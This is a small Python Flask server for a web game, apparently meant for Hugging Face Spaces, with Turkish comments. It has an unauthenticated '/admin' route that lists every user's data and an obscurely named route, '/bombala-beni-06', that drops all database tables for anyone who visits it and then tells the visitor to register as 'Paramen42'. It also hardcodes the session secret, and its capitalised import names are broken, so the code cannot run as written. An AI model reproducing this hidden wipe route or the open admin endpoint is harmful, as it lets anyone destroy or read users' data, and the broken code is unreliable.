#!/usr/bin/env python3
import os
import sys
from Flask import Flask, render_template, jsonify, request, session, redirect, url_for
import json
import time
import threading
from werkzeug.security import generate_password_hash, check_password_hash
from Flask_SQLAlchemy import SQLAlchemy
from sqlalchemy import text

app = Flask(__name__)

# Database URL - SQLite için
database_url = "sqlite:///database.db"

app.config['SQLALCHEMY_DATABASE_URI'] = database_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.secret_key = 'globalmarket_secret_key'
db = SQLAlchemy(app)

# User model
class User(db.Model):
    __tablename__ = 'users'
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    data = db.Column(db.Text, nullable=False)
    is_admin = db.Column(db.Boolean, default=False)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/admin')
def admin():
    try:
        users = User.query.all()
        user_list = []
        for user in users:
            data = json.loads(user.data) if user.data else {}
            user_list.append({
                'username': user.username,
                'money': data.get('money', 0),
                'level': data.get('level', 1),
                'is_admin': data.get('is_admin', False)
            })
        return jsonify({'users': user_list, 'total': len(user_list)})
    except Exception as e:
        return f"Hata: {str(e)}", 500

@app.route('/bombala-beni-06')
def bombala():
    try:
        db.drop_all()
        db.create_all()
        return "TUM HESAPLAR SILINDI! Paramen42 olarak kayit ol!"
    except Exception as e:
        return f"Hata: {str(e)}", 500

@app.route('/game')
def game():
    return render_template('game.html')

if __name__ == '__main__':
    # Hugging Face için host kontrolü
    port = 7860
    host = '0.0.0.0' if os.getenv('SPACE_NAME') else '127.0.0.1'
    app.run(host=host, port=port)
